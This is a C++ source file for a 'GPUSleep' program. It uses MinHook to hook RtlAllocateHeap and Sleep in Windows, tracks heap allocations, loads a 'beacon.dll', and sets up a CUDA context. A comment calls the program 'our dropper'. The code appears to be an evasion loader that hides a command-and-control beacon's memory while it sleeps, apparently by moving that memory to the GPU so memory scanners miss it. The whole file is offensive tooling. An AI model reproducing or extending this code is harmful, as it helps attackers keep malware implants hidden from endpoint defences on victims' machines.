// GPUSleep.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include "utils.h"
#include "cuda.h"

#pragma comment(lib, "libMinHook.x64.lib")
#pragma warning(disable:6011)
#pragma warning(disable:6387)

DWORD GlobalThreadId;
LPVOID(WINAPI* OldHeapAlloc)(HANDLE, DWORD, SIZE_T);
void (WINAPI* OldSleep)(DWORD);
std::map<LPVOID, DWORD> heapMap;

NVIDIA_API_TABLE Api = { 0 };
CUDA_CONTEXT Context = NULL;
HMODULE dll;

int main()
{
    std::cout << "Starting\n";
    GlobalThreadId = GetCurrentThreadId(); //We get the thread Id of our dropper!

    printf("MH_Initialize()\n");
    if (MH_Initialize() != MH_OK)
        goto EXIT_ROUTINE;

    printf("MH_CreateHookApiEx()\n");
    if (MH_CreateHookApiEx(L"ntdll.dll", "RtlAllocateHeap", &HookedHeapAlloc, &OldHeapAlloc) != MH_OK)
        goto EXIT_ROUTINE;

    printf("MH_CreateHookApiEx()\n");
    if (MH_CreateHookApiEx(L"kernel32.dll", "Sleep", &HookedSleep, &OldSleep) != MH_OK)
        goto EXIT_ROUTINE;

    printf("MH_EnableHook()\n");
    if (MH_EnableHook(MH_ALL_HOOKS) != MH_OK)
        goto EXIT_ROUTINE;

    printf("LoadingBeacon\n");
    dll = LoadLibraryA("beacon.dll");

    //Test DLL
    //run1(heapMap);

    int stop;
    std::cin >> stop;

EXIT_ROUTINE:
    MH_DisableHook(MH_ALL_HOOKS);

    if (Context != NULL)
        Api.CudaDestroyContext(&Context);

    if (Api.NvidiaLibary)
        FreeLibrary(Api.NvidiaLibary);
}